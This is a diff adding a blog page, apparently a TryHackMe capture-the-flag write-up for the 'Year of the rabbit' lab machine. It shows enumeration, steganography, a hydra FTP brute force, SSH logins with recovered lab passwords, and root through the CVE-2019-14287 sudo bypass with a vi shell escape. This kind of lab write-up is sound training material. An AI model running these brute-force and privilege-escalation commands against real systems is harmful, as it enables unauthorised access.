@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="nair0lf32 ">
+<meta name="description" content="Enumeration nmap PORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack vsftpd 3.0.2 22/tcp open ssh syn-ack OpenSSH 6.7p1 Debian 5 (protocol 2.0) | ssh-hostkey: | 1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA) | ssh-dss AAAAB3NzaC1kc3MAAACBAILCKdtvyy1FqH1gBS&#43;POXpHMlDynp&#43;m6Ewj2yoK2PJKJeQeO2yRty1/qcf0eAHJGRngc9&#43;bRPYe4M518&#43;7yBVdO2p8UbIItiGzQHEXJu0tGdhIxmpbTdCT6V8HqIDjzrq2OB/PmsjoApVHv9N5q1Mb2i9J9wcnzlorK03gJ9vpxAAAAFQDVV1vsKCWHW/gHLSdO40jzZKVoyQAAAIA9EgFqJeRxwuCjzhyeASUEe&#43;Wz9PwQ4lJI6g1z/1XNnCKQ9O6SkL54oTkB30RbFXBT54s3a11e5ahKxtDp6u9yHfItFOYhBt424m14ks/MXkDYOR7y07FbBYP5WJWk0UiKdskRej9P79bUGrXIcHQj3c3HnwDfKDnflN56Fk9rIwAAAIBlt2RBJWg3ZUqbRSsdaW61ArR4YU7FVLDgU0pHAIF6eq2R6CCRDjtbHE4X5eW&#43;jhi6XMLbRjik9XOK78r2qyQwvHADW1hSWF6FgfF2PF5JKnvPG3qF2aZ2iOj9BVmsS5MnwdSNBytRydx9QJiyaI4&#43;HyOkwomj0SINqR9CxYLfRA== | 2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZyTWF65dczfLiKN0cNpHhm/nZ7FWafVaCf&#43;Oxu7&#43;9VM4GBO/8eWI5CedcIDkhU3Li/XBDUSELLXSRJOtQj5WdBOrFVBWWA3b3ICQqk0N1cmldVJRLoP1shBm/U5Xgs5QFx/0nvtXSGFwBGpfVKsiI/YBGrDkgJNAYdgWOzcQqol/nnam8EpPx0nZ6&#43;c2ckqRCizDuqHXkNN/HVjpH0GhiscE6S6ULvq2bbf7ULjvWbrSAMEo6ENsy3RMEcQX&#43;Ixxr0TQjKdjW&#43;QdLay0sR7oIiATh5AL5vBGHTk2uR8ypsz1y7cTyXG2BjIVpNWeTzcip7a2/HYNNSJ1Y5QmAXoKd | 256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHKavguvzBa889jvV30DH4fhXzMcLv6VdHFx3FVcAE0MqHRcLIyZcLcg6Rf0TNOhMQuu7Cut4Bf6SQseNVNJKK8= | 256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFBJPbfvzsYSbGxT7dwo158eVWRlfvXCxeOB4ypi9Hgh 80/tcp open http syn-ack Apache httpd 2.4.10 ((Debian)) |_http-title: Apache2 Debian Default Page: It works |_http-server-header: Apache/2.4.10 (Debian) | http-methods: |_ Supported Methods: POST OPTIONS GET HEAD Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel ffuf ." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://nair0lf32.github.io/zer0ne/writeups/tryhackme/year-of-the-rabbit/year-of-the-rabbit/" />
+
+
+    <title>
+        
+            Year of the rabbit :: Zer0ne  — welcome friend
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="https://nair0lf32.github.io/zer0ne/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://nair0lf32.github.io/zer0ne/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://nair0lf32.github.io/zer0ne/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://nair0lf32.github.io/zer0ne/favicon-16x16.png">
+    <link rel="manifest" href="https://nair0lf32.github.io/zer0ne/site.webmanifest">
+    <link rel="mask-icon" href="https://nair0lf32.github.io/zer0ne/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="https://nair0lf32.github.io/zer0ne/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="Year of the rabbit">
+<meta itemprop="description" content="Enumeration nmap PORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack vsftpd 3.0.2 22/tcp open ssh syn-ack OpenSSH 6.7p1 Debian 5 (protocol 2.0) | ssh-hostkey: | 1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA) | ssh-dss AAAAB3NzaC1kc3MAAACBAILCKdtvyy1FqH1gBS&#43;POXpHMlDynp&#43;m6Ewj2yoK2PJKJeQeO2yRty1/qcf0eAHJGRngc9&#43;bRPYe4M518&#43;7yBVdO2p8UbIItiGzQHEXJu0tGdhIxmpbTdCT6V8HqIDjzrq2OB/PmsjoApVHv9N5q1Mb2i9J9wcnzlorK03gJ9vpxAAAAFQDVV1vsKCWHW/gHLSdO40jzZKVoyQAAAIA9EgFqJeRxwuCjzhyeASUEe&#43;Wz9PwQ4lJI6g1z/1XNnCKQ9O6SkL54oTkB30RbFXBT54s3a11e5ahKxtDp6u9yHfItFOYhBt424m14ks/MXkDYOR7y07FbBYP5WJWk0UiKdskRej9P79bUGrXIcHQj3c3HnwDfKDnflN56Fk9rIwAAAIBlt2RBJWg3ZUqbRSsdaW61ArR4YU7FVLDgU0pHAIF6eq2R6CCRDjtbHE4X5eW&#43;jhi6XMLbRjik9XOK78r2qyQwvHADW1hSWF6FgfF2PF5JKnvPG3qF2aZ2iOj9BVmsS5MnwdSNBytRydx9QJiyaI4&#43;HyOkwomj0SINqR9CxYLfRA== | 2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZyTWF65dczfLiKN0cNpHhm/nZ7FWafVaCf&#43;Oxu7&#43;9VM4GBO/8eWI5CedcIDkhU3Li/XBDUSELLXSRJOtQj5WdBOrFVBWWA3b3ICQqk0N1cmldVJRLoP1shBm/U5Xgs5QFx/0nvtXSGFwBGpfVKsiI/YBGrDkgJNAYdgWOzcQqol/nnam8EpPx0nZ6&#43;c2ckqRCizDuqHXkNN/HVjpH0GhiscE6S6ULvq2bbf7ULjvWbrSAMEo6ENsy3RMEcQX&#43;Ixxr0TQjKdjW&#43;QdLay0sR7oIiATh5AL5vBGHTk2uR8ypsz1y7cTyXG2BjIVpNWeTzcip7a2/HYNNSJ1Y5QmAXoKd | 256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHKavguvzBa889jvV30DH4fhXzMcLv6VdHFx3FVcAE0MqHRcLIyZcLcg6Rf0TNOhMQuu7Cut4Bf6SQseNVNJKK8= | 256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFBJPbfvzsYSbGxT7dwo158eVWRlfvXCxeOB4ypi9Hgh 80/tcp open http syn-ack Apache httpd 2.4.10 ((Debian)) |_http-title: Apache2 Debian Default Page: It works |_http-server-header: Apache/2.4.10 (Debian) | http-methods: |_ Supported Methods: POST OPTIONS GET HEAD Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel ffuf ."><meta itemprop="datePublished" content="2022-09-20T16:00:31+01:00" />
+<meta itemprop="dateModified" content="2022-09-20T16:00:31+01:00" />
+<meta itemprop="wordCount" content="772"><meta itemprop="image" content="https://nair0lf32.github.io/zer0ne"/>
+<meta itemprop="keywords" content="" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://nair0lf32.github.io/zer0ne"/>
+
+<meta name="twitter:title" content="Year of the rabbit"/>
+<meta name="twitter:description" content="Enumeration nmap PORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack vsftpd 3.0.2 22/tcp open ssh syn-ack OpenSSH 6.7p1 Debian 5 (protocol 2.0) | ssh-hostkey: | 1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA) | ssh-dss AAAAB3NzaC1kc3MAAACBAILCKdtvyy1FqH1gBS&#43;POXpHMlDynp&#43;m6Ewj2yoK2PJKJeQeO2yRty1/qcf0eAHJGRngc9&#43;bRPYe4M518&#43;7yBVdO2p8UbIItiGzQHEXJu0tGdhIxmpbTdCT6V8HqIDjzrq2OB/PmsjoApVHv9N5q1Mb2i9J9wcnzlorK03gJ9vpxAAAAFQDVV1vsKCWHW/gHLSdO40jzZKVoyQAAAIA9EgFqJeRxwuCjzhyeASUEe&#43;Wz9PwQ4lJI6g1z/1XNnCKQ9O6SkL54oTkB30RbFXBT54s3a11e5ahKxtDp6u9yHfItFOYhBt424m14ks/MXkDYOR7y07FbBYP5WJWk0UiKdskRej9P79bUGrXIcHQj3c3HnwDfKDnflN56Fk9rIwAAAIBlt2RBJWg3ZUqbRSsdaW61ArR4YU7FVLDgU0pHAIF6eq2R6CCRDjtbHE4X5eW&#43;jhi6XMLbRjik9XOK78r2qyQwvHADW1hSWF6FgfF2PF5JKnvPG3qF2aZ2iOj9BVmsS5MnwdSNBytRydx9QJiyaI4&#43;HyOkwomj0SINqR9CxYLfRA== | 2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZyTWF65dczfLiKN0cNpHhm/nZ7FWafVaCf&#43;Oxu7&#43;9VM4GBO/8eWI5CedcIDkhU3Li/XBDUSELLXSRJOtQj5WdBOrFVBWWA3b3ICQqk0N1cmldVJRLoP1shBm/U5Xgs5QFx/0nvtXSGFwBGpfVKsiI/YBGrDkgJNAYdgWOzcQqol/nnam8EpPx0nZ6&#43;c2ckqRCizDuqHXkNN/HVjpH0GhiscE6S6ULvq2bbf7ULjvWbrSAMEo6ENsy3RMEcQX&#43;Ixxr0TQjKdjW&#43;QdLay0sR7oIiATh5AL5vBGHTk2uR8ypsz1y7cTyXG2BjIVpNWeTzcip7a2/HYNNSJ1Y5QmAXoKd | 256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHKavguvzBa889jvV30DH4fhXzMcLv6VdHFx3FVcAE0MqHRcLIyZcLcg6Rf0TNOhMQuu7Cut4Bf6SQseNVNJKK8= | 256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFBJPbfvzsYSbGxT7dwo158eVWRlfvXCxeOB4ypi9Hgh 80/tcp open http syn-ack Apache httpd 2.4.10 ((Debian)) |_http-title: Apache2 Debian Default Page: It works |_http-server-header: Apache/2.4.10 (Debian) | http-methods: |_ Supported Methods: POST OPTIONS GET HEAD Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel ffuf ."/>
+
+
+
+    <meta property="og:title" content="Year of the rabbit" />
+<meta property="og:description" content="Enumeration nmap PORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack vsftpd 3.0.2 22/tcp open ssh syn-ack OpenSSH 6.7p1 Debian 5 (protocol 2.0) | ssh-hostkey: | 1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA) | ssh-dss AAAAB3NzaC1kc3MAAACBAILCKdtvyy1FqH1gBS&#43;POXpHMlDynp&#43;m6Ewj2yoK2PJKJeQeO2yRty1/qcf0eAHJGRngc9&#43;bRPYe4M518&#43;7yBVdO2p8UbIItiGzQHEXJu0tGdhIxmpbTdCT6V8HqIDjzrq2OB/PmsjoApVHv9N5q1Mb2i9J9wcnzlorK03gJ9vpxAAAAFQDVV1vsKCWHW/gHLSdO40jzZKVoyQAAAIA9EgFqJeRxwuCjzhyeASUEe&#43;Wz9PwQ4lJI6g1z/1XNnCKQ9O6SkL54oTkB30RbFXBT54s3a11e5ahKxtDp6u9yHfItFOYhBt424m14ks/MXkDYOR7y07FbBYP5WJWk0UiKdskRej9P79bUGrXIcHQj3c3HnwDfKDnflN56Fk9rIwAAAIBlt2RBJWg3ZUqbRSsdaW61ArR4YU7FVLDgU0pHAIF6eq2R6CCRDjtbHE4X5eW&#43;jhi6XMLbRjik9XOK78r2qyQwvHADW1hSWF6FgfF2PF5JKnvPG3qF2aZ2iOj9BVmsS5MnwdSNBytRydx9QJiyaI4&#43;HyOkwomj0SINqR9CxYLfRA== | 2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZyTWF65dczfLiKN0cNpHhm/nZ7FWafVaCf&#43;Oxu7&#43;9VM4GBO/8eWI5CedcIDkhU3Li/XBDUSELLXSRJOtQj5WdBOrFVBWWA3b3ICQqk0N1cmldVJRLoP1shBm/U5Xgs5QFx/0nvtXSGFwBGpfVKsiI/YBGrDkgJNAYdgWOzcQqol/nnam8EpPx0nZ6&#43;c2ckqRCizDuqHXkNN/HVjpH0GhiscE6S6ULvq2bbf7ULjvWbrSAMEo6ENsy3RMEcQX&#43;Ixxr0TQjKdjW&#43;QdLay0sR7oIiATh5AL5vBGHTk2uR8ypsz1y7cTyXG2BjIVpNWeTzcip7a2/HYNNSJ1Y5QmAXoKd | 256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHKavguvzBa889jvV30DH4fhXzMcLv6VdHFx3FVcAE0MqHRcLIyZcLcg6Rf0TNOhMQuu7Cut4Bf6SQseNVNJKK8= | 256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFBJPbfvzsYSbGxT7dwo158eVWRlfvXCxeOB4ypi9Hgh 80/tcp open http syn-ack Apache httpd 2.4.10 ((Debian)) |_http-title: Apache2 Debian Default Page: It works |_http-server-header: Apache/2.4.10 (Debian) | http-methods: |_ Supported Methods: POST OPTIONS GET HEAD Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel ffuf ." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://nair0lf32.github.io/zer0ne/writeups/tryhackme/year-of-the-rabbit/year-of-the-rabbit/" /><meta property="og:image" content="https://nair0lf32.github.io/zer0ne"/><meta property="article:section" content="writeups" />
+<meta property="article:published_time" content="2022-09-20T16:00:31+01:00" />
+<meta property="article:modified_time" content="2022-09-20T16:00:31+01:00" /><meta property="og:site_name" content="Zer0ne" />
+
+
+
+
+    <meta property="article:section" content="TryHackMe" />
+
+
+
+    <meta property="article:published_time" content="2022-09-20 16:00:31 &#43;0100 WAT" />
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://nair0lf32.github.io/zer0ne/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">&gt;</span>
+            <span class="logo__text">Zer0ne #</span>
+            <span class="logo__cursor" style=
+                  "
+                   background-color:#0FF00D;
+                   animation-duration:2s;">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://nair0lf32.github.io/zer0ne/about">About</a></li><li><a href="https://nair0lf32.github.io/zer0ne/posts">Blog</a></li><li><a href="https://nair0lf32.github.io/zer0ne/writeups">Writeups</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="https://nair0lf32.github.io/zer0ne/writeups/tryhackme/year-of-the-rabbit/year-of-the-rabbit/">Year of the rabbit</a></h2>
+
+            
+            
+            
+
+            <div class="post-content">
+                <!-- raw HTML omitted -->
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="nmap">nmap</h3>
+<pre tabindex="0"><code>PORT   STATE SERVICE REASON  VERSION
+21/tcp open  ftp     syn-ack vsftpd 3.0.2
+
+22/tcp open  ssh     syn-ack OpenSSH 6.7p1 Debian 5 (protocol 2.0)
+| ssh-hostkey:
+|   1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA)
+| ssh-dss AAAAB3NzaC1kc3MAAACBAILCKdtvyy1FqH1gBS+POXpHMlDynp+m6Ewj2yoK2PJKJeQeO2yRty1/qcf0eAHJGRngc9+bRPYe4M518+7yBVdO2p8UbIItiGzQHEXJu0tGdhIxmpbTdCT6V8HqIDjzrq2OB/PmsjoApVHv9N5q1Mb2i9J9wcnzlorK03gJ9vpxAAAAFQDVV1vsKCWHW/gHLSdO40jzZKVoyQAAAIA9EgFqJeRxwuCjzhyeASUEe+Wz9PwQ4lJI6g1z/1XNnCKQ9O6SkL54oTkB30RbFXBT54s3a11e5ahKxtDp6u9yHfItFOYhBt424m14ks/MXkDYOR7y07FbBYP5WJWk0UiKdskRej9P79bUGrXIcHQj3c3HnwDfKDnflN56Fk9rIwAAAIBlt2RBJWg3ZUqbRSsdaW61ArR4YU7FVLDgU0pHAIF6eq2R6CCRDjtbHE4X5eW+jhi6XMLbRjik9XOK78r2qyQwvHADW1hSWF6FgfF2PF5JKnvPG3qF2aZ2iOj9BVmsS5MnwdSNBytRydx9QJiyaI4+HyOkwomj0SINqR9CxYLfRA==
+|   2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZyTWF65dczfLiKN0cNpHhm/nZ7FWafVaCf+Oxu7+9VM4GBO/8eWI5CedcIDkhU3Li/XBDUSELLXSRJOtQj5WdBOrFVBWWA3b3ICQqk0N1cmldVJRLoP1shBm/U5Xgs5QFx/0nvtXSGFwBGpfVKsiI/YBGrDkgJNAYdgWOzcQqol/nnam8EpPx0nZ6+c2ckqRCizDuqHXkNN/HVjpH0GhiscE6S6ULvq2bbf7ULjvWbrSAMEo6ENsy3RMEcQX+Ixxr0TQjKdjW+QdLay0sR7oIiATh5AL5vBGHTk2uR8ypsz1y7cTyXG2BjIVpNWeTzcip7a2/HYNNSJ1Y5QmAXoKd
+|   256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHKavguvzBa889jvV30DH4fhXzMcLv6VdHFx3FVcAE0MqHRcLIyZcLcg6Rf0TNOhMQuu7Cut4Bf6SQseNVNJKK8=
+|   256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFBJPbfvzsYSbGxT7dwo158eVWRlfvXCxeOB4ypi9Hgh
+
+80/tcp open  http    syn-ack Apache httpd 2.4.10 ((Debian))
+|_http-title: Apache2 Debian Default Page: It works
+|_http-server-header: Apache/2.4.10 (Debian)
+| http-methods:
+|_  Supported Methods: POST OPTIONS GET HEAD
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><h3 id="ffuf">ffuf</h3>
+<pre tabindex="0"><code>.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10]
+.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10]
+                        [Status: 200, Size: 7853, Words: 2862, Lines: 190]
+.hta                    [Status: 403, Size: 277, Words: 20, Lines: 10]
+assets                  [Status: 301, Size: 313, Words: 20, Lines: 10]
+index.html              [Status: 200, Size: 0, Words: 1, Lines: 1]
+server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]
+</code></pre><p>Upon website enumeration we visit <code>/assets</code> dir there is a <code>rickrolled.mp4</code> video (lol)</p>
+<p>and a css file&hellip;that we might as well check and oh&hellip;</p>
+<pre tabindex="0"><code>/* Nice to see someone checking the stylesheets.
+     Take a look at the page: /sup3r_s3cr3t_fl4g.php
+  */
+</code></pre><p>People hide things in stylesheets now? wow! who would know?</p>
+<p>they recommand to disable javascript? we fire up <code>burpsuite</code> instead</p>
+<p>we see that before redirecting us to a rickroll (that I dodged like a pro )</p>
+<p>it does a request with a nice parameter</p>
+<pre tabindex="0"><code>GET /intermediary.php?hidden_directory=/WExYY2Cv-qU HTTP/1.1
+Host: 10.10.27.204
+</code></pre><p>We just visit the <code>/WExYY2Cv-qU</code> dir to get a picture named <code>Hot_Babe.png</code></p>
+<!-- raw HTML omitted -->
+<p>I sense steganography</p>
+<pre tabindex="0"><code>└──╼ $exif Hot_Babe.png
+Données corrompues
+Les données fournies ne respectent pas les spécifications.
+ExifLoader: Les données fournies ne semblent pas contenir de données EXIF.
+
+└──╼ $steghide --info Hot_Babe.png
+steghide: le format du fichier &#34;Hot_Babe.png&#34; n&#39;est pas support�.
+
+└──╼ $binwalk -e Hot_Babe.png
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             PNG image, 512 x 512, 8-bit/color RGB, non-interlaced
+54            0x36            Zlib compressed data, best compression
+</code></pre><p>Yeah indeed&hellip;I try <code>strings</code> and yes it was that</p>
+<pre tabindex="0"><code>Eh, you&#39;ve earned this. Username for FTP is ftpuser
+One of these is the password:
+...
+</code></pre><p>I copy the list in a <code>dict.txt</code> file</p>
+<p>Now we can either try each password manually like cavemen&hellip;or use hydra</p>
+<p>I trust ya&rsquo;ll on this to make the best choice</p>
+<p>I do it the peasant way</p>
+<pre tabindex="0"><code>└──╼ $hydra -l ftpuser -P dict.txt ftp://10.10.27.204
+Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-12-03 12:34:14
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 82 login tries (l:1/p:82), ~6 tries per task
+[DATA] attacking ftp://10.10.27.204:21/
+[21][ftp] host: 10.10.27.204   login: ftpuser   password: 5iez1wGXKfPKQ
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-12-03 12:34:29
+</code></pre><p>Now we can ftp as <code>ftpuser : 5iez1wGXKfPKQ</code></p>
+<p>We get <code>Eli</code>&rsquo;s creds&hellip;but in <code>brainf*ck</code></p>
+<p>Let me decode that for yo real quick</p>
+<pre tabindex="0"><code>User: eli
+
+Password: DSpDiM1wAEwid
+</code></pre><p>We get access</p>
+<pre tabindex="0"><code>└──╼ $ssh eli@10.10.154.151
+The authenticity of host &#39;10.10.154.151 (10.10.154.151)&#39; can&#39;t be established.
+ECDSA key fingerprint is SHA256:ISBm3muLdVA/w4A1cm7QOQQOCSMRlPdDp/x8CNpbJc8.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#39;10.10.154.151&#39; (ECDSA) to the list of known hosts.
+eli@10.10.154.151&#39;s password:
+
+
+1 new message
+Message from Root to Gwendoline:
+
+&#34;Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I&#39;ve left you a hidden message there&#34;
+
+END MESSAGE
+
+
+
+
+eli@year-of-the-rabbit:~$
+</code></pre><p>nice ambiance&hellip;we are at the right place</p>
+<pre tabindex="0"><code>eli@year-of-the-rabbit:/home/gwendoline$ ls
+user.txt
+eli@year-of-the-rabbit:/home/gwendoline$ cat user.txt
+cat: user.txt: Permission denied
+</code></pre><p>I don&rsquo;t know what I expected</p>
+<pre tabindex="0"><code>eli@year-of-the-rabbit:/home/gwendoline$ find / -name &#34;*s3cr3t*&#34; 2&gt; /dev/null
+/var/www/html/sup3r_s3cr3t_fl4g.php
+/usr/games/s3cr3t
+eli@year-of-the-rabbit:/home/gwendoline$
+</code></pre><p>Let&rsquo;s meddle with people&rsquo;s affairs</p>
+<pre tabindex="0"><code>eli@year-of-the-rabbit:/usr/games/s3cr3t$ ls -al
+total 12
+drwxr-xr-x 2 root root 4096 Jan 23  2020 .
+drwxr-xr-x 3 root root 4096 Jan 23  2020 ..
+-rw-r--r-- 1 root root  138 Jan 23  2020 .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
+eli@year-of-the-rabbit:/usr/games/s3cr3t$ cat .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
+Your password is awful, Gwendoline.
+It should be at least 60 characters long! Not just MniVCQVhQHUNI
+Honestly!
+
+Yours sincerely
+   -Root
+</code></pre><p>they say its for her only but let us all have read access</p>
+<p>LMAO 60 characters&hellip;</p>
+<p>now we got access as <code>gwendoline : MniVCQVhQHUNI</code></p>
+<pre tabindex="0"><code>gwendoline@year-of-the-rabbit:~$ cat user.txt
+THM{hmm_what_s_up_doc_?}
+</code></pre><h2 id="privileges-escalation">Privileges escalation</h2>
+<p>The classics</p>
+<pre tabindex="0"><code>gwendoline@year-of-the-rabbit:~$ sudo -l
+Matching Defaults entries for gwendoline on year-of-the-rabbit:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User gwendoline may run the following commands on year-of-the-rabbit:
+    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
+</code></pre><p>hmm&hellip;<code>!root</code></p>
+<p>hmm&hellip;<code>vi</code></p>
+<p>I say <code>cve-2019-14287</code></p>
+<p>I remember it from a nice tryhackme room dedicated to it so check it <a href="https://tryhackme.com/room/sudovulnsbypass">here</a></p>
+<p><code>sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt</code></p>
+<p>Now that <code>vi</code> is open, use the classic <code>:!/bin/bash</code></p>
+<p>(you can visit gfobins for that one)</p>
+<pre tabindex="0"><code>root@year-of-the-rabbit:/home/gwendoline# id
+uid=0(root) gid=0(root) groups=0(root)
+
+root@year-of-the-rabbit:/root# cat root.txt
+THM{duck_season_rabbit_season}
+</code></pre><p>And its done!</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+            
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
+
+        <span class="tag"><a href="https://nair0lf32.github.io/zer0ne/categories/tryhackme/">TryHackMe</a></span>
+        
+    </p>
+
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2023</span>
+            <span><a href="https://nair0lf32.github.io/zer0ne">nair0lf32</a></span>
+            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
+            <span><a href="https://nair0lf32.github.io/zer0ne/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+            
+        </div>
+    </div>
+    
+    
+    <div class="footer__inner">
+        <div class="footer__content">
